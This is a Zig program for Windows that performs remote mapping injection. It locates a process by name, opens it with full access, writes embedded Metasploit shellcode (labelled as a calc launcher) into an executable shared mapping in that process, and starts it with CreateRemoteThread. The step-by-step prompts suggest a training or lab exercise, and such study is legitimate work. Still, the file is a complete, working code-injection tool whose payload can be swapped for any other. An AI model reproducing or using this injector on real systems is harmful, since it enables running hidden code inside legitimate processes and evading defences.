const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;
const unicode = std.unicode;

const HANDLE = windows.HANDLE;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const WINAPI = windows.WINAPI;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const PVOID = windows.PVOID;
const SIZE_T = windows.SIZE_T;
const PBYTE = [*]u8;

const CloseHandle = windows.CloseHandle;

// Memory protection constants
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;

// File mapping constants
const FILE_MAP_WRITE: DWORD = 0x2;
const FILE_MAP_EXECUTE: DWORD = 0x20;

// Process access constants
const PROCESS_ALL_ACCESS: DWORD = 0x001F0FFF;

// Toolhelp32 constants
const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
const MAX_PATH: usize = 260;

const NUMA_NO_PREFERRED_NODE: u32 = 0xffffffff;

const PROCESSENTRY32 = extern struct {
    dwSize: windows.DWORD,
    cntUsage: windows.DWORD,
    th32ProcessID: windows.DWORD,
    th32DefaultHeapID: usize,
    th32ModuleID: windows.DWORD,
    cntThreads: windows.DWORD,
    th32ParentProcessID: windows.DWORD,
    pcPriClassBase: i32,
    dwFlags: windows.DWORD,
    szExeFile: [MAX_PATH]u8,
};

// x64 calc metasploit shellcode
const payload = [_]u8{
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
};

// Process entry structure
const PROCESSENTRY32W = extern struct {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: usize,
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: i32,
    dwFlags: DWORD,
    szExeFile: [MAX_PATH]u16,
};

// External Windows API functions
extern "kernel32" fn CreateFileMappingW(
    hFile: HANDLE,
    lpFileMappingAttributes: ?*windows.SECURITY_ATTRIBUTES,
    flProtect: DWORD,
    dwMaximumSizeHigh: DWORD,
    dwMaximumSizeLow: DWORD,
    lpName: ?[*:0]const u16,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: HANDLE,
    dwDesiredAccess: DWORD,
    dwFileOffsetHigh: DWORD,
    dwFileOffsetLow: DWORD,
    dwNumberOfBytesToMap: SIZE_T,
) callconv(WINAPI) ?PVOID;

extern "api-ms-win-core-memory-l1-1-5" fn MapViewOfFileNuma2(
    FileMappingHandle: HANDLE,
    ProcessHandle: HANDLE,
    Offset: u64, // ULONG64
    BaseAddress: ?*anyopaque, // PVOID (optional)
    ViewSize: usize, // SIZE_T
    AllocationType: u32, // ULONG
    PageProtection: u32, // ULONG
    PreferredNode: u32, // ULONG
) callconv(windows.WINAPI) ?*anyopaque; // Returns PVOID

extern "kernel32" fn CreateToolhelp32Snapshot(
    dwFlags: DWORD,
    th32ProcessID: DWORD,
) callconv(WINAPI) HANDLE;

extern "kernel32" fn Process32First(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn Process32Next(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: DWORD,
    bInheritHandle: BOOL,
    dwProcessId: DWORD,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn CreateRemoteThread(
    hProcess: HANDLE,
    lpThreadAttributes: ?*windows.SECURITY_ATTRIBUTES,
    dwStackSize: SIZE_T,
    lpStartAddress: PVOID,
    lpParameter: ?PVOID,
    dwCreationFlags: DWORD,
    lpThreadId: ?*DWORD,
) callconv(WINAPI) ?HANDLE;

// Allocate a local `Mapped` writable buffer and copy the payload to it
// then it maps that local buffer to an executable remote buffer, so that the remotely allocated buffer
// includes the payload. It returns the base address of the payload
fn remoteMapInject(hProcess: HANDLE, pPayload: []const u8, ppAddress: *?PVOID) bool {
    var bState: bool = true;
    var hFile: ?HANDLE = null;
    var pMapLocalAddress: ?PVOID = null;
    var pMapRemoteAddress: ?PVOID = null;

    // Create a file mapping handle with `RWX` memory permissions
    hFile = CreateFileMappingW(
        INVALID_HANDLE_VALUE,
        null,
        PAGE_EXECUTE_READWRITE,
        0,
        @intCast(pPayload.len),
        null,
    );

    if (hFile == null) {
        print("\t[!] CreateFileMapping Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        return bState;
    }

    // Maps the view of the payload to the memory
    // FILE_MAP_WRITE are the permissions of the file (payload) -
    // since we only need to write (copy) the payload to it
    pMapLocalAddress = MapViewOfFile(
        hFile.?,
        FILE_MAP_WRITE,
        0,
        0,
        pPayload.len,
    );

    if (pMapLocalAddress == null) {
        print("\t[!] MapViewOfFile Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("\t[+] Local Mapping Address : 0x{X}\n", .{@intFromPtr(pMapLocalAddress.?)});

    waitForEnter("\t[#] Press <Enter> To Write The Payload ... ");
    print("\t[i] Copying Payload To 0x{X} ... ", .{@intFromPtr(pMapLocalAddress.?)});

    // Copy payload to mapped memory
    const dest = @as([*]u8, @ptrCast(pMapLocalAddress.?));
    @memcpy(dest[0..pPayload.len], pPayload);

    print("[+] DONE\n", .{});

    // Maps the payload to a new remote buffer (in the target process)
    // It is possible here to change the memory permissions to `RWX`
    pMapRemoteAddress = MapViewOfFileNuma2(hFile.?, hProcess, 0, null, 0, 0, PAGE_EXECUTE_READWRITE, NUMA_NO_PREFERRED_NODE);

    if (pMapRemoteAddress == null) {
        print("\t[!] MapViewOfFile2 Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("\t[+] Remote Mapping Address : 0x{X}\n", .{@intFromPtr(pMapRemoteAddress.?)});

    ppAddress.* = pMapRemoteAddress;
    if (hFile) |handle| _ = CloseHandle(handle);
    return bState;
}

fn getRemoteProcessHandle(process_name: []const u16, process_id: *windows.DWORD, process_handle: *?windows.HANDLE) bool {
    // Initialize return values to null
    process_id.* = 0;
    process_handle.* = null;

    // Take a snapshot of currently running processes
    const h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) {
        std.debug.print("\t[!] CreateToolhelp32Snapshot Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        return false;
    }
    defer {
        _ = windows.CloseHandle(h_snapshot);
    }

    // Setup process entry
    var proc = PROCESSENTRY32{
        .dwSize = @sizeOf(PROCESSENTRY32),
        .cntUsage = 0,
        .th32ProcessID = 0,
        .th32DefaultHeapID = 0,
        .th32ModuleID = 0,
        .cntThreads = 0,
        .th32ParentProcessID = 0,
        .pcPriClassBase = 0,
        .dwFlags = 0,
        .szExeFile = undefined,
    };

    // Get first process
    if (Process32First(h_snapshot, &proc) == 0) {
        std.debug.print("\n\t[!] Process32First Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        return false;
    }

    // Loop through processes
    while (true) {
        // Convert process name to lowercase for comparison
        var lower_name: [MAX_PATH * 2]u16 = undefined;
        @memset(&lower_name, 0);

        // Convert proc.szExeFile to wide string and make lowercase for comparison
        var utf16_process_name: [MAX_PATH]u16 = undefined;
        var utf16_length: usize = 0;

        // Convert ANSI to UTF-16
        for (0..MAX_PATH) |i| {
            if (proc.szExeFile[i] == 0) {
                break;
            }
            utf16_process_name[i] = @as(u16, proc.szExeFile[i]);
            utf16_length = i + 1;
        }
        utf16_process_name[utf16_length] = 0; // Null terminate

        // Convert to lowercase
        var i: usize = 0;
        while (i < utf16_length) : (i += 1) {
            const c = utf16_process_name[i];
            if (c >= 'A' and c <= 'Z') {
                lower_name[i] = c + ('a' - 'A');
            } else {
                lower_name[i] = c;
            }
        }
        lower_name[i] = 0; // Null terminate

        // Compare names
        var match = true;
        i = 0;
        while (i < process_name.len and process_name[i] != 0 and i < MAX_PATH * 2) : (i += 1) {
            if (process_name[i] != lower_name[i]) {
                match = false;
                break;
            }
            if (lower_name[i] == 0) break;
        }

        if (match) {
            // We found the process
            process_id.* = proc.th32ProcessID;
            process_handle.* = OpenProcess(PROCESS_ALL_ACCESS, 0, proc.th32ProcessID);

            if (process_handle.* == null) {
                std.debug.print("\n\t[!] OpenProcess Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
            }
            break;
        }

        // Get next process
        if (Process32Next(h_snapshot, &proc) == 0) {
            break;
        }
    }

    return (process_id.* != 0 and process_handle.* != null);
}

// Helper function to get length of a null-terminated wide string
fn getStringLength(str: [*]const u16) usize {
    var len: usize = 0;
    while (str[len] != 0) : (len += 1) {}
    return len;
}

// Helper function to compare null-terminated wide strings
fn compareWideStrings(str1: [*]const u16, str2: [*:0]const u16) i32 {
    var i: usize = 0;
    while (true) {
        const c1 = str1[i];
        const c2 = str2[i];

        if (c1 != c2) {
            return if (c1 < c2) -1 else 1;
        }

        if (c1 == 0) { // Both are 0 since c1 == c2
            return 0;
        }

        i += 1;
    }
}

fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

pub fn main() !void {
    var allocator = std.heap.page_allocator;
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    var hProcess: ?HANDLE = null;
    var hThread: ?HANDLE = null;
    var pAddress: ?PVOID = null;
    var dwProcessId: DWORD = 0;

    if (args.len < 2) {
        print("[!] Usage : \"{s}\" <Process Name>\n", .{args[0]});
        return;
    }

    // Convert process name to UTF-16
    const processName = try std.unicode.utf8ToUtf16LeAllocZ(allocator, args[1]);
    defer allocator.free(processName);

    // Convert to lowercase for comparison
    var lowerProcessName = try allocator.alloc(u16, processName.len);
    defer allocator.free(lowerProcessName);

    for (processName[0 .. processName.len - 1], 0..) |char, i| {
        lowerProcessName[i] = std.ascii.toLower(@intCast(char));
    }

    print("[i] Searching For Process Id Of \"{s}\" ... ", .{args[1]});
    if (!getRemoteProcessHandle(lowerProcessName[0 .. processName.len - 1], &dwProcessId, &hProcess)) {
        print("[!] Process is Not Found\n", .{});
        return;
    }
    print("[+] DONE\n", .{});
    print("[+] Found Target Process Pid: {}\n", .{dwProcessId});

    print("[i] Injecting Target Process ...\n", .{});
    if (!remoteMapInject(hProcess.?, payload[0..], &pAddress)) {
        print("[!] FAILED\n", .{});
        return;
    }
    print("[+] DONE\n", .{});

    waitForEnter("[#] Press <Enter> To Run The Payload ... ");

    hThread = CreateRemoteThread(
        hProcess.?,
        null,
        0,
        pAddress.?,
        null,
        0,
        null,
    );

    if (hThread == null) {
        print("[!] CreateRemoteThread Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
    }

    waitForEnter("[#] Press <Enter> To Quit ... ");

    // Clean up handles
    if (hThread) |handle| _ = CloseHandle(handle);
    if (hProcess) |handle| _ = CloseHandle(handle);
}
